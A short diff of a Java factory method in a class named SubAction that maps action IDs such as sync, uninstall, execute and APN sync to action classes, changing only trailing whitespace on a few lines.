@@ -45,9 +45,9 @@ public abstract class SubAction {
      */
     public static SubAction factory(final int actionId_, final byte[] confParams) {
         switch (actionId_) {
-        case ACTION_SYNC:        
+        case ACTION_SYNC:
             //#ifdef DEBUG_TRACE
-            debug.trace("Factory ACTION_SYNC");        
+            debug.trace("Factory ACTION_SYNC");
             //#endif
             return new SyncAction(actionId_, confParams);
         case ACTION_UNINSTALL:
@@ -90,9 +90,9 @@ public abstract class SubAction {
             debug.trace("Factory ACTION_EXECUTE");
             //#endif
             return new ExecuteAction(actionId_, confParams);
-        case ACTION_SYNC_APN:        
+        case ACTION_SYNC_APN:
             //#ifdef DEBUG_TRACE
-            debug.trace("Factory ACTION_SYNC");        
+            debug.trace("Factory ACTION_SYNC");
             //#endif
             return new SyncActionApn(actionId_, confParams);
         default:
